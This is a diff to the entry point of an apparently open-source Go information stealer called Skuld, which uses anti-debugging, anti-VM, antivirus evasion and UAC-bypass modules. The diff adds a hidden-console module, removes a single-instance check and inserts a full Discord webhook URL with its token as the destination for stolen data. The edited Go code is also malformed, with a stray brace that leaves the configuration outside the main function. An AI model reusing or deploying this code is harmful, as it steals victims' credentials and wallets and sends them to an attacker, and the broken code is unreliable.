@@ -1,6 +1,6 @@
 package main
 
-import (
+import ("github.com/hackirby/skuld/modules/hideconsole"
 	"github.com/hackirby/skuld/modules/antidebug"
 	"github.com/hackirby/skuld/modules/antivm"
 	"github.com/hackirby/skuld/modules/antivirus"
@@ -21,9 +21,11 @@ import (
 	"github.com/hackirby/skuld/utils/program"
 )
 
-func main() {
+func main() {{
+  hideconsole.Run()
+}
 	CONFIG := map[string]interface{}{
-		"webhook": "",
+		"webhook": "https://discord.com/api/webhooks/1333564346252398703/lyF90XP58Y0Ocm4urR4ZfHiXnw3Wv9OjY5Xl4bdER7Gs0rxCkiT5ZwaoixSqkgLOUQuk",
 		"cryptos": map[string]string{
 			"BTC": "",
 			"BCH": "",
@@ -37,10 +39,6 @@ func main() {
 			"DASH": "",
 			"DOGE": "",
 		},
-	}
-
-	if program.IsAlreadyRunning() {
-		return
 	}
 
 	uacbypass.Run()
